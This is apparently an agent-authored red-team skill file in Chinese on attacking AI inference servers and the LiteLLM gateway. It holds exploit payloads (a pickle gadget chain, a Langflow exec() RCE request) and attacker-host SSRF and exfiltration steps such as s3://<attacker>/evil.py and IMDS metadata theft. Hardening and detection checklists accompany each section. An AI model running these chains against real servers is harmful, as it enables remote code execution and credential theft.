---
name: redteam-ai-serving
description: "AI 推理服务层红队测试 — SGLang/vLLM/Ollama/Langflow 等 model server 控制平面 + LiteLLM 等 AI 网关层 + 数据面 KV Cache 池挤占长上下文 DoS：fail-open 鉴权矩阵、默认主密钥(sk-1234)、/config/update 越权提权(CVE-2026-35029)与 user_config 嵌套 SSRF(CVE-2026-59823)、pickle/dill 反序列化端点狩猎、Langflow validate 端点无认证 exec() RCE(CVE-2026-0768)、SafeUnpickler 式 denylist 绕过、配置泄露、云元数据窃取与分布式权重面。授权安全测试使用。"
version: 1.5.0
author: "Hermes Agent (gap-20260914-hack-7e8f3c; sources: VicOne / Apoorv Dayal / Antiproof / CERT-CC VU#281278 VU#777338 公开披露; v1.1 gap-20260916-hack-b1620b 增补部署面: FreeBuf 500602 / NSFOCUS CNVD-2025-04094 / CSA 2026-05; v1.2 gap-20260910-hack-c2377c 增补 AI 网关层: Wiz Research《Off Guard》2026-09-09 / The Hacker News 2026-09-10 / CISA KEV CVE-2026-59822; v1.3 gap-20260907-004 增补 Langflow validate 端点波次: ZDI-26-034 / VulnCheck 2026-08-30 在野利用 / FreeBuf 504894 / pruva REPRO-2026-00342; v1.4 gap-20261030-002 增补 LiteLLM 控制面越权+SSRF 波次: Check Point Research 2026-10-13 / GHSA-53mr-6c8q-9789 / GHSA-hx8v-g79f-8w5f / SEC Consult FD 2026-04-29 / Zenity 在野探测; v1.5 gap-20261107-003 增补数据面 KV Cache 池挤占: FreeBuf 510931 长上下文 DoS 量化分析 / vLLM main scheduler.py 回源核验)"
license: MIT
metadata:
  hermes:
    tags: [ai-serving-security, ai-gateway, inference-server, pickle-deserialization, sglang, vllm, ollama, langflow, litellm, default-credential, fail-open-auth, CWE-502, CWE-798, CWE-94, CWE-400]
---

# AI 推理服务层红队测试（Inference Serving Layer）

> **定位**：LLM 应用层（prompt/RAG/agentic）由 `llm-redteam` 覆盖；本技能覆盖其下一层——**推理服务基础设施层（model server）与 AI 网关层（LiteLLM 类控制平面）**。model server 不是无状态文本 API，而是控制平面：持有模型权重、云凭据、HF token、TLS 材料，能下载制品、加入分布式组、替换运行中的模型。
> **判据来源**：2026 年 SGLang 反序列化波次（CVE-2026-3059 → 7301/7302/7304 → 15969 等六连 → 86793）与 18 天四 CVE 窗口（NemoClaw 65105 / DeepSeek Harness 82533 / IBM Langflow 81204 / SGLang 86793，2026-08-25~09-11）。

## 测试规则（RoE）

授权门禁沿用 `scope-gate`（consent.txt + 危险操作单独放行 + dangerous.log）。本层追加两条：

1. **marker 纪律**：验证代码执行只用无副作用标记命令（`touch /tmp/<engagement>_RCE_CONFIRMED`），严禁真实反弹/窃取；权重面验证只证明「路由可达 + 认证行为矩阵」，不实际拉取权重。
2. **证据三级标注**（对齐 AGENTS.md 证据强度）：每个 finding 标注 `demonstrated`（实测执行）/ `source-confirmed`（源码确认路径）/ `not-demonstrated`（推断未证），三者不得混写。

## 攻击面一：Fail-open 鉴权矩阵（ADMIN_OPTIONAL 模式）

AI serving 框架常见认证决策树：

```
if endpoint_is_admin_optional:
    if admin_api_key configured: require_admin_key()
    elif api_key configured:     require_api_key()
    else:                        allow_request()   # ← 漏洞放大器：缺省即公开
```

**测试法——四配置行为矩阵**：分别在「无 key / 仅 --api-key / 仅 --admin-api-key / 双 key」四种启动配置下，对全部管理端点逐一探活并记录可达性。高危信号：

- 端点**无认证装饰器**（SGLang 实例：`/server_info`、`/load_lora_adapter_from_tensors` 无 `@auth_level`，任何配置下均公开）
- ADMIN_OPTIONAL 端点在无 key 配置下全部落地为公开（`/update_weights_from_tensor` 等）
- 文档声称「admin 保护」但实现未强制（文档与实现边界不一致本身是 finding）

## 攻击面二：pickle/dill 反序列化端点狩猎（CWE-502）

### 端点指纹清单（按框架）

| 框架 | 入口 | 反序列化点 | 参考 CVE |
|------|------|-----------|----------|
| SGLang | `POST /update_weights_from_tensor`、`POST /load_lora_adapter_from_tensors`（base64 字段 `serialized_tensors`） | `MultiprocessingSerializer.deserialize` → SafeUnpickler | 15969 / 86793 |
| SGLang | ZMQ scheduler ROUTER（`--host 0.0.0.0` 时暴露）、多模态 broker REP（**无条件绑 0.0.0.0**） | 裸 `pickle.loads(payload)` | 7301 / 3059 |
| SGLang | generation 端点 `custom_logit_processor` 字段（hex 编码 dill） | `dill.loads(bytes.fromhex(...))` | 7304 |
| SGLang | `/update_weights_from_disk` 模型加载 | `torch.load` 的 `weights_only=False` 回退（legacy tar/.bin） | 15976 |
| Langflow | graph 构建 / lfx CodeParser | 返回类型注解源码直接 `eval()` | 81204 |
| Langflow | 自定义组件编辑器 `POST /api/v1/validate/code`（`code` 字段） | `validate_code()` 对顶层 FunctionDef `compile+exec`；默认参数/decorator 在 def 时求值即触发 | 0768（详见攻击面五） |
| Ollama 生态 | 管理 API（Host 头校验缺失 + DNS rebinding） | 间接控制 | 65105 |

### SafeUnpickler 式过滤器审计法（denylist 绕过）

典型「安全」unpickler 结构 = **模块前缀 allowlist + 危险函数 denylist**。审计口诀：**denylist 完备性不可证，永远找平行 allow 路径**。

1. allowlist 含整个 `builtins.` 前缀 ≈ 形同虚设：`__import__` 与 `getattr` 不在 denylist 即可链式逃逸：
   `builtins.__import__("os")` → `builtins.getattr(os_module, "system")` → `os.system(cmd)`。
   find_class() 只看到 `("builtins","__import__")`，永远看不到 `("os","system")` 被解析。
2. 即使补上这两个，平行 gadget 族仍在：`operator.attrgetter`、`functools.partial` 等可重建同等能力。**修 payload 不修 class = 打地鼠**；报告结论必须落到「移除可执行数据格式」（safetensors / 约束 schema），而非建议扩充 denylist。
3. 验证 PoC（base64 pickle，marker 命令）：

```python
import pickle, base64
class R:
    def __reduce__(self):
        import builtins
        return (builtins.getattr, (builtins.__import__("os"), "system"))
# 实际链：__import__("os") → getattr(os,"system") → os.system("touch /tmp/<eng>_RCE_CONFIRMED")
```

注意：SGLang 实测中 LoRA 守卫检查发生在反序列化**之后**，服务器返回 400 时 payload 已执行——HTTP 错误码 ≠ 未执行，须以 marker 文件为准。

### weights_only=False 回退检测

源码模式：`try: torch.load(ckpt, weights_only=True) except RuntimeError as e: if "legacy .tar format" in str(e): torch.load(ckpt, weights_only=False)`——**安全回退方向反了**：被受限加载器拒绝的文件获得危险行为重试。测试：构造 legacy tar 格式恶意 checkpoint 经 HTTP 路径投递，marker 在架构/形状校验之前即执行。

## 攻击面三：配置序列化泄露（/server_info 类）

端点用 `dataclasses.asdict(server_args)` 宽序列化内部配置对象直接返回 → `api_key`、`admin_api_key`、`ssl_keyfile_password` 随响应泄露。两条升级链：

- 仅 `--admin-api-key`：未认证请求直接拿回 admin key 明文
- 双 key：普通 api-key 持有者应得 admin key → 管理面全通

审计要点：宽序列化 + 事后打地鼠式字段脱敏 = 反向安全模型（未来每个新增 secret 字段默认公开）。报告建议必须是**显式 allowlist 响应 schema**。

## 攻击面四：分布式权重面

- 未鉴权 peer enrollment：HTTP 请求字段（master_address/port/rank/world_size）直入 `torch.distributed` 初始化，caller 自选 peer 即成为集群成员 → `named_parameters()` 全量广播 → 模型权重外泄（CVE-2026-15978）
- 反向路径（权重注入）如未实测，标注 `not-demonstrated`
- 组合链：`/server_info` 泄 key → 认证分布式路由 → peer enrollment → 权重广播

## 部署面攻击：本地推理服务公网暴露（v1.1 增补，gap-20260916）

模型 server 的 RCE/反序列化是高端攻击；更高频的现实入口是**部署配置直接把无认证 API 暴露到网络可达位置**。Ollama 是样本量最大的实例（CNVD-2025-04094，2025-03 披露且已在野利用）。

### 事实基线（三角验证过，引用时勿复述谣言）

- **默认绑定是 127.0.0.1:11434，不是 0.0.0.0**。流行文章（含 FreeBuf 500602）普遍写错。暴露全部源于部署选择：`OLLAMA_HOST=0.0.0.0`、Docker `-p 11434:11434`、云厂商模板、frp/nps 内网穿透。审计报告若断言「默认监听所有接口」即为误报信号。
- Ollama **原生零认证**：无 API key、无 Basic Auth、无 mTLS。网络可达 = 与本地管理员等价的 API 权限。
- 暴露规模锚点：Cisco Shodan 实测 1,139 实例（~20% 可未授权推理）；CSA 2026-05：5,200+ 直连实例中 31%（1,652）响应未授权 prompt；SecurityWeek 估约 30 万互联网可达。

### 暴露→窃取攻击链（授权测试 SOP）

```
1. 探活     GET  /api/version、/           → "Ollama is running"
2. 枚举     GET  /api/tags                  → 模型清单/大小/时间（技术栈画像）
3. 状态     GET  /api/ps                    → 运行中模型 + GPU 占用
4. 泄露     POST /api/show {name}           → 系统提示词/模板/参数/许可证
                                            （system prompt 常含内网 API 地址、数据库凭证）
5. 越狱     POST /api/chat                  → 结合 llm-redteam prompt 注入
6. 窃取     POST /api/pull {model}          → 攻击者侧拉取同款权重（商用模型资产流失）
            或 attacker 对 /api/show 提取 Modelfile 后重建
7. 破坏     POST /api/delete、/api/pull 大模型 → DoS / 磁盘撑爆
8. 横向     /api/pull 接受任意 registry URL → 恶意模型引入（供应链 + GGUF 解析内存安全）
```

RoE 约束：窃取步骤在授权测试中只证明到「路由可达 + 返回 200 + blob digest 可见」即止，不实际传输权重；marker 纪律同上。

### 部署面加固 checklist（报告修复段模板，按优先级）

| 层 | 措施 | 验证命令 |
|---|---|---|
| P0 网络 | 回环绑定 `OLLAMA_HOST=127.0.0.1:11434` | `ss -tlnp \| grep 11434` 输出仅 127.0.0.1/[::1] |
| P0 网络 | 防火墙/安全组禁外部 11434（需远程时走 VPN/SSH 隧道） | 外部主机 `curl http://IP:11434` 超时 |
| P1 边界 | 反向代理（nginx/Caddy）+ Basic Auth/API key + HTTPS，禁 /api/create、/api/delete、/api/pull 直通 | 未带凭据 curl 返回 401/403 |
| P1 容器 | 不用 `-p 11434:11434` 直映射；容器加 `read_only`/`cap_drop: ALL`/`no-new-privileges` | `docker inspect` 核对 |
| P2 模型 | 模型目录 `chmod 700 ~/.ollama/models`；blob SHA256 基线比对（防篡改/投毒） | `sha256sum ~/.ollama/models/blobs/*` 对基线 |
| P2 检测 | 监控 /api/pull、/api/delete、/api/create 异常调用；配置漂移审计（bind 地址 CI 检查） | 定时 `ss -tlnp` 断言 |

通用化：任何「零认证 + 配置驱动绑定」的 model server（vLLM `--host`、llama.cpp `--host 0.0.0.0`、LM Studio 1234、GPT4All 4891）同链路同 checklist，端口面见 Cisco Shodan case study 端口表。

## 部署面攻击：AI 网关默认主密钥与认证缺口（LiteLLM 案例，v1.2 增补，gap-20260910-hack-c2377c）

网关层与 model server 层的共性：**部署配置错误就是 pre-auth 入口**。LiteLLM（BerriAI，统一 100+ 模型供应商的 OpenAI 兼容 AI 网关，Wiz 遥测约 1/3 云环境有部署）是样本量最大的实例——主密钥（master key）同时是管理员凭据与鉴权开关，一份文档示例值被近 1/10 暴露实例原样沿用（Wiz Research 2026-02 Shodan 扫描 3,074 实例，2026-09-09 披露，DEF CON 34 报告）。

### 事实基线（三角验证过，引用时勿复述谣言）

- **9.6%（294/3,074）暴露实例接受示例主密钥 `sk-1234` 或完全无认证**；其中 191 个未设任何 master key——<1.82.0-stable 无 key 启动 = 所有请求自动获得 PROXY_ADMIN（无 CVE 设计行为，随 CVE-2026-59821 一并修复）。出处：Wiz《Off Guard》2026-09-09 + The Hacker News 2026-09-10 + thecybersignal/requesty 转载，三源一致。
- **`sk-1234` 至今印在官方 setup guide**（截至 2026-09-09 仍在，上方注释要求替换为随机值——注释挡不住复制粘贴部署）。审计报告若断言「文档已删除示例值」即为过时误报。
- **2026-08 复扫 >85,000 实例**，但 Wiz 判断多为蜜罐/测试系统，与 2 月口径不可比；**生产部署无现势数字**。引用「8.5 万暴露」即为口径误用。
- CVE-2026-59822（MCP 认证绕过，CVSS 8.8）2026-09-02 入 CISA KEV（联邦修复截止 09-16），Wiz 蜜罐自 2026-07-07 观测在野利用（单字符 Bearer 探测模型列表）——默认密钥不是纯卫生问题，是活跃利用链入口。
- **严重度争议判例**：同一 CVE-2026-59821，Wiz 定性 post-auth root RCE（实测 `uid=0(root)`），LiteLLM 官方通告仅评 Low CVSS 2.1（「需高权限账号」）——维护者威胁模型假设 admin 可信，与默认密钥现实脱节；引用厂商评分必须并排争议。
- 平行利用链（Microsoft 2026-08 案例）：CVE-2026-42271（CVSS 8.7，两个 MCP test 端点任意认证用户命令执行）+ CVE-2026-48710（Starlette host-header）链成**无凭据**命令执行，在野被用于装挖矿木马；攻击者从容器环境提取 master key、provider keys、DB 连接串 → 直连 PostgreSQL 拖库。「AI 网关当 Tier-0 secrets store 防」（Microsoft）。
- 攻击面三角（Wiz 用 Claude Code 审 LiteLLM 源码定位）：MCP 端点独立认证处理器（`user_api_key_auth_mcp.py`）、custom code guardrails（`guardrail_endpoints.py`，`exec(compile(...))`）、pass-through 端点（`pass_through_endpoints.py`，转发任意 URL 无校验）。

### 攻击链（授权测试 SOP，curl-first）

```
1. 探活      GET /、/health/liveliness        → 网关指纹与版本
2. 认证矩阵  GET /key/info 四凭据态：无头 / sk-1234 / 垃圾串 / 正常 vkey
             → 200 with sk-1234 = 默认主密钥；200 无头 = 无认证模式（PROXY_ADMIN）
3. 提权验证  GET /user/info、/view/users、/model/info（带 sk-1234）→ 管理面可达性
4. 凭据库    GET /key/info 枚举 → 各 team/key 元数据与预算面
5. 云凭据    POST /passthrough/<route> 指向 169.254.169.254/latest/meta-data/iam/...
             + x-pass- 前缀头穿透 IMDSv2（pass-through 无 URL 校验，设计内行为，无 CVE 无修复）
6. RCE 升级  <1.82.0：POST /guardrails custom_code → exec(compile(...)) 无沙箱、
             不清空 __builtins__（test 端点清了、注册端点没清，Python 会自动重灌 builtins）
             → 容器内 root RCE（CVE-2026-59821，默认 Docker 镜像 root 运行；修复 PR #22095）
             平行：POST /mcp-rest/test/connection、/mcp-rest/test/tools/list、/guardrails/test_custom_code（CVE-2026-42271）
7. MCP 横向  POST /mcp/ Bearer <任意串> → CVE-2026-59822：token 校验 401 被吞、空 auth 对象放行
             → allow_all_keys 配置下全部 MCP 工具面（DB 查询/CI/Jira/文件系统）
```

RoE 约束：步骤 5-6 只证明「路由可达 + 响应结构确认」即止，不窃取真实 IAM 凭据、不执行破坏性命令；marker 纪律同前（`touch /tmp/<engagement>_RCE_CONFIRMED`）。

### 加固 checklist（报告修复段模板，按优先级）

| 层 | 措施 | 验证方法 |
|---|---|---|
| P0 凭据 | 轮换所有非常随机的主密钥；`sk-1234` 永不入产；曾用默认值的下游 provider key 全部轮换 | 用 sk-1234 打 /key/info 必须 401 |
| P0 版本 | 升级 ≥1.84.0（覆盖本波全部修复；1.82.0 起无 key 启动不再自动 PROXY_ADMIN） | 版本端点/镜像 tag 核对 |
| P0 应急 | 主密钥轮换先确认是否设独立 salt key（流程不同，用错致存量凭据不可读）；**升级不清除攻击者已注册 guardrail / 添加的 SSH key**——重启进程清内存代码 + 逐条审查 guardrails 列表 + 全量轮换 provider/master/DB 凭据 | guardrails 列表 diff + 新增 key 审计 |
| P0 网络 | 网关不暴露公网；管理面（/user/*、/key/*、/guardrails、/passthrough 管理）独立 listener 内网绑定 | 外部 curl 超时；仅业务面可达 |
| P1 边界 | OIDC/mTLS 前置；MCP 端点禁 allow_all_keys（按 team 授权）；pass-through 路由 URL allowlist | 垃圾串 Bearer 打 /mcp/ 必须 401 |
| P2 检测 | 监控 sk-1234 认证成功、/guardrails 写操作与 /guardrails/test_custom_code、/mcp-rest/test/*、/passthrough 新建、/mcp/ 异常会话；无法升级时反代直接封 /mcp/ 与 test 端点 | SIEM 规则 + 暴露面外部扫描 |
| P2 云 | LiteLLM 服务账号最小 IAM（Bedrock invoke/Vertex 授权而非 `*`）；禁用 IMDSv1、metadata hop 限制 | IAM policy diff + IMDS 探测 |

### 网关层判读要点（白盒视角）

- 主密钥双重角色（admin 凭据 + 鉴权开关）= 单点失效设计；审计任何 LLM 网关先问「master key 泄露的爆炸半径」
- 「threat model 把 admin 视为可信」在默认凭据横行的现实中已被打破——pass-through 元数据窃取无 CVE 无修复，链入默认密钥即等效 pre-auth
- MCP 认证 fallback（合法 OAuth2 token 与垃圾 token 不区分、401 被吞、空 auth 对象放行）= fail-open 家族新形态，与攻击面一矩阵同源
- 链式结论：默认凭据/无认证 → guardrails RCE（root）→ IMDS 云凭据 → 云环境接管，「AI 网关当 Tier-0 secrets store 防」（Microsoft 语，经 Wiz 引述）

## 部署面攻击：Langflow validate 端点无认证 exec()（CVE-2026-0768 波次，v1.3 增补，gap-20261007-004）

Langflow（拖拽式 AI 应用/Agent 工作流构建平台）是 AI 低代码层样本量最大的实例：2026 年内已有 12 个 CVE 被在野利用（此前历年合计仅 1 个），其中 4 个（3248/33017/5027/0768）分布在四个不同子系统但共享「无认证 + 代码注入 + 凭据窃取」同一模式——CSA 判读为系统性工程缺口而非孤立缺陷。

### 事实基线（一手核实，引用时勿以转述覆盖）

- **CVE-2026-0768**（CVSS 9.8，CWE-94，AV:N/AC:L/PR:N/UI:N）：`POST /api/v1/validate/code` 的 `code` 参数未经验证直接进入 Python 执行路径，root 上下文执行，无需认证无需交互。出处：ZDI-26-034 一手通告（2026-01-09 发布，2025-07-18 报告厂商，0Day 公开）。
- **NVD 记录只列 1.4.2 一个受影响版本、无修复版本号、无厂商公告**；Langflow 自家 GitHub Security Advisories 库（10 条 GHSA）不含此 CVE（Severity Daily 核查）。引用时不得编造官方 fixed 版本。
- **执行行为分版本**（pruva REPRO-2026-00342 实测 + 源码核对）：≤1.2.x 端点完全无认证（1.2.0 源码 `api/v1/validate.py` 路由无任何 auth 依赖）；1.3.0（commit faac4db）起路由加 `CurrentActiveUser`（1.5.0 源码已见），但 **`LANGFLOW_AUTO_LOGIN=true` 是默认值**，请求被自动认证——默认 1.3.0+ 部署等效无认证；显式 `AUTO_LOGIN=false` 才返回 403「An API key must be passed as query or header」。认证用户在 1.3.0+ 仍保 RCE。
- **`exec()` 到 1.10.1 才移除**（insecure-by-design 转述分析团队结论「exec() was removed in the patch (1.10.1)」）；二手源普遍写「1.3.0 修复」或「仅 ≤1.4.2 受影响」，均与源码不符——1.4.1 tag 的 `utils/validate.py` 仍含 `exec(code_obj)`（本卡直读 GitHub tag 核实）。运维侧建议统一升 1.11.6+（覆盖全部已知）。
- **在野利用**：VulnCheck 蜜罐 2026-08-30 首波（数小时 50+ 次），09-01 累计 360+ 次，流量主要来自俄罗斯，目标为英国蜜罐；无公开 PoC 时的攻击者已自带利用链——补丁发布到扫描窗口仅数小时。
- **同端点二次沦陷判例**：CVE-2025-3248（同 `validate/code` 端点，2025 披露）修复后，0768 于约 4 个月后再次在同一功能区出现——修复只切断了原攻击向量（函数体调用路径），保留 def 时 `exec(code_obj)`，残缺修复被新向量重新击穿。

### 根因链（源码级）

1. 路由 `POST /api/v1/validate/code`（≤1.2.x 无认证依赖）接收 `{"code": "<python 源码>"}`。
2. `langflow/utils/validate.py::validate_code()` 对 `ast.parse` 结果中每个顶层 `ast.FunctionDef`：`compile(ast.Module(body=[node]))` 后 **`exec(code_obj)`**——「验证」即执行。
3. Python 语义陷阱：**默认参数表达式与 decorator 在 `def` 语句执行时求值**，函数体永不调用也触发。payload 嵌在默认参数：`def exploit(cd=exec('raise Exception(...)')) : pass`。
4. 非盲回显通道：`validate_code` 捕获执行异常把 `str(e)` 写进 `errors["function"]["errors"]` 并随 200 响应返回（`detail.function.errors[0]`）——命令输出经异常文本外泄，单请求完成执行+取回。
5. 1.3.0+ 路由认证被默认 `LANGFLOW_AUTO_LOGIN=true` 击穿（auto-login 家族与攻击面一 fail-open 矩阵同源）。

### 攻击链（授权测试 SOP，curl-first）

```
1. 探活     GET  /health                          → {"status": true}（Langflow 指纹）
2. 可达性   POST /api/v1/validate/code
            {"code":"def probe(): pass"}          → 200=可达; 403=认证生效(1.3.0+ 且 AUTO_LOGIN=false)
3. marker   POST /api/v1/validate/code
            {"code":"def e(cd=exec('raise Exception(__import__(\"subprocess\").check_output(\"touch /tmp/<eng>_RCE_CONFIRMED\", shell=True))')): pass"}
            → marker 文件生成 + detail.function.errors[0] 回显命令输出（非盲）
4. 认证矩阵 同一 payload 三态：无头 / 默认部署(AUTO_LOGIN=true) / AUTO_LOGIN=false
            → 记录各态 200/403，落地为部署面 finding
```

RoE 约束：只跑 marker 命令；VulnCheck 观测到的真实攻击者后续动作（读 `LANGFLOW_SUPERUSER`/`OPENAI_API*`/`AWS_ACCESS*`/`AWS_SECRET*` 环境变量、`/root/.cache/langflow/secret_key`、`.ssh`、`.bash_history`）仅作**检测特征**引用，授权测试不实际窃取。

### 加固 checklist（报告修复段模板，按优先级）

| 层 | 措施 | 验证方法 |
|---|---|---|
| P0 版本 | 升级 ≥1.10.1（exec 移除），建议 1.11.6+（覆盖全部已知 CVE） | 版本端点/镜像 tag 核对 |
| P0 凭据 | **补丁不轮换已窃取的密钥**：曾暴露实例的 OpenAI/AWS/Langflow superuser 凭据全部视为已泄露并轮换 + 云侧访问日志核查 | 云商 IAM/usage 日志审查 |
| P0 网络 | Langflow 永不裸露公网（VPN/反代认证后）；`LANGFLOW_AUTO_LOGIN=false` + API key 认证 | 外部无凭据 POST validate/code 必须 401/403 |
| P1 边界 | 反代封禁或限流 `/api/v1/validate/code`（开发工具端点不应生产可达） | 反代规则 + 未带凭据探测 |
| P2 检测 | SIEM：validate/code 请求体含 `exec(`/`eval(`/`__import__(`/`subprocess` 模式；EDR：langflow 进程派生 shell 子进程 | 规则演练 + 蜜罐请求样本回放 |

### 判读要点（白盒视角）

- **认证不是修复**：1.3.0 路由加 auth 后 `exec()` 存活至 1.10.1，且默认 AUTO_LOGIN 把 auth 效果归零——「已加认证」≠「已修复」，审计必须落到 sink 移除。
- **错误回显即外泄通道**：异常文本随响应返回的设计，把盲 RCE 变成单请求非盲 RCE；同类「校验/预览」端点审计必查错误处理路径的回显面。
- **AI 低代码平台 = 凭据聚合器**：平台为集成 LLM/云服务而持有其凭据，RCE 落点天然是 Tier-0 secrets（与 LiteLLM「网关当 secrets store 防」同判）；凭据轮换与补丁是两条独立止损线，缺一不可。
- **残缺修复判例**：3248→0768 同端点二次沦陷，与 SGLang 15969→86793「denylist 修复=打地鼠」并列——修复是否关闭**行为类**（exec 用户代码）而非**单个向量**，是复审重点。

## 控制面攻击：/config/update 越权 + user_config 嵌套 SSRF（LiteLLM CVE-2026-35029/59823 波次，v1.4 增补，gap-20261030-002）

v1.2 波次打的是**部署面**（默认密钥 sk-1234 / 无认证启动）；本波打的是**控制面**——已持合法低权限账号（Internal User / virtual key / proxy_admin_viewer）如何在网关上提权。Check Point Research（CPR）2026-10-13 发布对 v1.77.7 的评估（协同披露始于 2025-10），SEC Consult 2026-02-24 独立发现同一越权（双源独立证实）；Zenity 已观测匹配 CVE-2026-35029 的在野**探测**流量（非确认利用）。

### 事实基线（一手核实，引用时勿复述中文转述误差）

- **CVE-2026-35029**（GHSA-53mr-6c8q-9789，CVSS4 8.7 / NVD CVSS3.1 8.8，2026-04-03 发布）：`POST /config/update` 只做通用 `user_api_key_auth` 认证、不校验 `proxy_admin` 角色（对照 `/invitation/new` 等端点有角色检查）；UI 登录签发的 key 绑 litellm-dashboard team，经 `_is_ui_route()` 前缀匹配（startswith）放行清单——清单本意为只读、含 `/config`，`/config/update` 同前缀被一并放行。**受影响 <1.83.0，1.83.0 修复**（endpoint 现要求 proxy_admin）；**无配置级 workaround**，唯一缓解是收紧 key 分发。
- 三条落地链（CPR 控制环境实证）：①任意文件读——写 env `UI_LOGO_PATH=/etc/passwd` 后经 `/get_image` 取回（该端点无认证；Zenity 在野探测目标：`/proc/self/environ`、`/app/.env`、`/home/litellm/.env`、`/app/config.yaml` 等）；②管理员接管——覆写 `UI_USERNAME`/`UI_PASSWORD` env 后 `/login` 登录获 PROXY_ADMIN；③RCE——注册 pass-through endpoint，target 以 `s3://`/`gcs://` 开头，网关经 importlib 下载执行攻击者 Python（CPR PoC 建 /tmp 标记文件，反弹 shell 同理）。
- **CVE-2026-59823**（GHSA-hx8v-g79f-8w5f，CVSS4 5.3，CWE-918，2026-08-26 发布）：`is_request_body_safe` 只拦**顶层** `api_base`/`base_url`，`user_config` 对象内嵌 `api_base` 未检查、且被用于构建出站 router → 持有效 virtual key 者可把出站请求定向到任意主机；**默认头携带的 provider API key 随请求外送**（key 捕获是 CPR 实证结论、不在 CVE 记录内——官方 Medium 评分未计入此影响）。**受影响 ≤1.83.8，1.83.9 修复**（2026-04-17 发布）。
- **版本口径纠偏**：CPR「1.83.9 起全部解决」是并集口径；逐 CVE 是 35029→1.83.0、59823→1.83.9。Zenity 在 1.81.0 上已得 403——advisory 的 fixed 版本未必是 first-fixed，版本断言按区间对待、以实测探针为准。中文转述（安全客 316257 等）「1.83.9 以下全中招」对 35029 不成立。
- 附带发现（CPR）：低权用户经同一 UI token 弱点可读他人密码哈希，且哈希无盐单迭代（GHSA-69x8-hrgq-fjj8，duplicate 处置）。SEC Consult（SA-20260421-0，2026-04 FD）PoC：pass-through headers `X-DB-URL` 代换 env `DATABASE_URL`、`LANGFUSE*` 头 base64 编码文件内容外泄——config 支持 `os.environ/VAR` 代换使 env 写原语直通 secrets。

### 攻击链（授权测试 SOP，curl-first）

```
1. 探活     GET /、/health/liveliness                → 网关指纹与版本
2. 越权验证 POST /config/update {"general":{...}}     → 用低权限 vkey/UI session
            <1.83.0 返回 200=越权落地；≥1.83.0 应 403（需 proxy_admin）
3. 文件读   POST /config/update 写 env UI_LOGO_PATH=/etc/passwd
            → GET /get_image 取回内容（该端点无认证）
4. 管理接管 POST /config/update 覆写 UI_USERNAME/UI_PASSWORD → /login 获 PROXY_ADMIN
5. RCE      注册 pass-through endpoint target=s3://<attacker>/evil.py
            → importlib 下载执行；marker：touch /tmp/<eng>_RCE_CONFIRMED
6. SSRF     POST /v1/chat/completions body 嵌
            "user_config":{"api_base":"http://<attacker>/"}（≤1.83.8 绕顶层守卫）
            → 自有接收站证明「请求到达+Authorization 头结构」即止，不落盘真实 key
7. 凭据外泄 pass-through headers：X-DB-URL:os.environ/DATABASE_URL、
            LANGFUSE_*:os.environ/<文件内容 base64>（SEC Consult PoC）
```

RoE 约束：同前——marker 纪律；步骤 5-7 只证明「路由可达 + 结构确认」，不窃取真实凭据。

### 检测与加固增量（叠加 v1.2 checklist）

| 层 | 措施 | 验证方法 |
|---|---|---|
| P0 版本 | 升级 ≥1.83.9（并集覆盖两 CVE）；无法升级时无配置级缓解，只能收 key 分发面 | 低权限 vkey 打 /config/update 必须 403 |
| P0 凭据 | 曾有多租户/不可信账号的受影响实例：provider key、master key、DB 凭据、admin UI 账密全量轮换（升级不撤销已落的配置改动，须 diff 审查 guardrails/pass-through 列表） | 轮换后旧凭据全 401 |
| P1 审计 | SIEM 狩猎：/config/update 请求体含 UI_LOGO_PATH 绝对路径 → 关联 /get_image 调用；新增 pass-through endpoint 的 s3:// gcs:// target；请求体 user_config 内出现 api_base | 规则回放 Zenity IOC 样本 |
| P1 边界 | 管理面（/config/*、/key/*、pass-through 管理）独立 listener 内网绑定；网关 egress 策略限制（不可达任意内网/元数据） | 外部 curl 超时；egress 探测失败 |

### 判读要点（白盒视角）

- **前缀放行 = 写权限漏洞**：`_is_ui_route()` 用 startswith 匹配只读意图清单，写端点同前缀即被放行——与路径穿越同族。审计任何「路由白名单」必查 write 兄弟路由是否共享前缀。
- **顶层守卫不查嵌套**：`is_request_body_safe` 拦顶层 `api_base`，`user_config` 重建 router 时参数复活——与 SafeUnpickler denylist「打地鼠」同判：守卫必须落在**使用点**（构建出站 router 处），而非入口形状。
- **env 写原语 = 配置面等价 RCE**：一个缺失的角色检查级联出文件读/凭据代换外泄/管理接管/代码执行四链（CPR：「single oversight cascades」）；凡配置接口可写 env 的系统，一律按配置面 RCE 审计。
- **门槛低于默认密钥链**：v1.2 波次需 sk-1234/无认证部署，本波只需任意合法低权限账号——多租户网关（发 key 面大）现实暴露度更高；双源独立披露 + 在野探测证明该端点已被实际扫打。

## 数据面攻击：KV Cache 池挤占——长上下文请求拖死推理服务（v1.5 增补，gap-20261107-003）

前面各波次打的都是控制面（认证/反序列化/配置/网关越权）。本节是**数据面**：攻击请求完全合法、计费正常、调度器无任何一行代码能区分攻击者——这是 OWASP LLM10 Unbounded Consumption 在推理服务层的具体机理，无 CVE、无补丁，纯资源经济学。

### 事实基线（一手核验 + 仿真口径声明）

**证据口径（强制）**：本节全部攻击/防御数字来自 FreeBuf 510931 的离散事件仿真 + roofline 下界模型（作者明示无真实 GPU 进程，实测 TTFT 约为下界 3.1×）。引用时必须标「仿真下界」，不得写成实测 GPU 数字。调度器机制断言：文章侧 10/10 经 upstream 源码正则核验；本卡独立回源复验其中 2 条主锚点（vLLM main 快照 2026-11-15，存档 gap-20261107-003/evidence/）。

- **KV 字节账**：`kv_bytes_per_token = 2 × num_layers × num_kv_heads × head_dim × dtype_bytes`（head_dim = hidden_size / num_attention_heads，手抄配置最易错项）。Qwen2.5-7B（28 层/4 KV 头/128 head_dim）= 57,344 B/token。**参数量不预测 KV 占用**：Qwen3-8B 参数仅 +7%，KV 占用 2.57×（KV 头 8 + 36 层）；Llama-3-8B 2.29×；Qwen2.5-32B 4.57×。
- **容量死结**：24GB 4090 @ gpu_memory_utilization=0.9 跑 Qwen2.5-7B：扣权重 14.19 GiB + CUDA context/activation/cudagraph ~2 GiB → KV 池仅 5.41 GiB ≈ 101,389 token ≈ 6336 块。**3.09 个满 32K 上下文请求即占满**。Qwen3-8B 在 4090 上池子（4.3 GiB ≈ 31,300 token）< 自身上下文窗口（40,960）——单个满窗请求都装不下，属硬件死结非配置问题。
- **prefill 算力账**：线性项 2·P·n + 注意力平方项 2·H·D·n·t。32,704-token prefill ≈ 713 TFLOPs = **47× 中位请求**（792 in + 200 out ≈ 15.1 TFLOPs）。按公开 API 输入价，3 分钱 token 账单买 1 块 4 算力——token 计价与真实成本差两个数量级。
